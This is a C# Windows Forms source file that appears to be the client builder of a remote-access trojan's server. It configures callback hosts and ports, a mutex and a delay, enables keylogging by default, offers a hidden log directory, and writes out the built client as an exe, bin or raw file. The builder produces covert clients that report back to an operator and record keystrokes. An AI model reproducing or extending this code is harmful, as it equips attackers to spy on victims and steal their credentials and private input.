﻿using 财源广进.Common.DNS;
using 财源广进.Common.Helpers;
using 财源广进.Server.Build;
using 财源广进.Server.Models;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;

namespace 财源广进.Server.Forms
{
    public partial class FrmBuilder : Form
    {
        private readonly BindingList<Host> _hosts = new BindingList<Host>();
        private readonly HostsConverter _hostsConverter = new HostsConverter();

        public FrmBuilder()
        {
            InitializeComponent();
        }

        private void FrmBuilder_Load(object sender, EventArgs e)
        {
            lstHosts.DataSource = new BindingSource(_hosts, null);
            numericUpDownPort.Value = 4782;
            numericUpDownDelay.Value = 5000;
            txtMutex.Text = KeyGenerator.GetUniqueKey(16);
            txtTag.Text = "Default";
            
            if (comboBoxOutputFormat.SelectedIndex == -1)
                comboBoxOutputFormat.SelectedIndex = 0;

            // 确保日志目录控件默认可用
            txtLogDirectoryName.Enabled = true;
            chkHideLogDirectory.Enabled = true;
            chkKeylogger.Checked = true;
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            if (_hosts.Count == 0)
            {
                MessageBox.Show(this, "Please add at least one host.", "Validation Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            BuildOptions options = new BuildOptions
            {
                Tag = txtTag.Text,
                Mutex = txtMutex.Text,
                RawHosts = _hostsConverter.ListToRawHosts(_hosts),
                Delay = (int)numericUpDownDelay.Value,
                Install = false, // 强制关闭安装功能
                Startup = false,
                ChangeAsmInfo = false,
                ChangeIcon = false,
                Keylogger = chkKeylogger.Checked,
                InstallName = "",
                InstallSub = "",
                LogDirectoryName = txtLogDirectoryName.Text
            };

            switch (comboBoxOutputFormat.SelectedIndex)
            {
                case 0: options.OutputFormat = OutputFormat.Exe; break;
                case 1: options.OutputFormat = OutputFormat.Bin; break;
                case 2: options.OutputFormat = OutputFormat.Raw; break;
                default: options.OutputFormat = OutputFormat.Exe; break;
            }

            using (SaveFileDialog sfd = new SaveFileDialog())
            {
                sfd.Title = "Save Client as";
                string ext = options.OutputFormat == OutputFormat.Exe ? ".exe" : (options.OutputFormat == OutputFormat.Bin ? ".bin" : ".raw");
                sfd.Filter = $"Files (*{ext})|*{ext}";
                sfd.FileName = "Client-built" + ext;
                if (sfd.ShowDialog() != DialogResult.OK) return;
                options.OutputPath = sfd.FileName;
            }

            btnBuild.Enabled = false;
            btnBuild.Text = "Building...";

            Thread t = new Thread(() => {
                try {
                    string clientPath = Path.Combine(Application.StartupPath, "Client.exe");
                    if (!File.Exists(clientPath)) clientPath = Path.Combine(Application.StartupPath, "client.bin");
                    var builder = new ClientBuilder(options, clientPath);
                    builder.Build();
                    this.Invoke((MethodInvoker)delegate {
                        MessageBox.Show(this, "Build Successful!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        btnBuild.Enabled = true;
                        btnBuild.Text = "Build Client";
                    });
                } catch (Exception ex) {
                    this.Invoke((MethodInvoker)delegate {
                        MessageBox.Show(this, "Build Failed: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        btnBuild.Enabled = true;
                        btnBuild.Text = "Build Client";
                    });
                }
            });
            t.Start();
        }

        private void btnAddHost_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(txtHost.Text)) return;
            _hosts.Add(new Host { Hostname = txtHost.Text, Port = (ushort)numericUpDownPort.Value });
            txtHost.Clear();
        }

        private void btnMutex_Click(object sender, EventArgs e)
        {
            txtMutex.Text = KeyGenerator.GetUniqueKey(16);
        }

        private void removeHostToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstHosts.SelectedItem != null)
            {
                _hosts.Remove((Host)lstHosts.SelectedItem);
            }
        }

        private void clearToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _hosts.Clear();
        }
    }
}
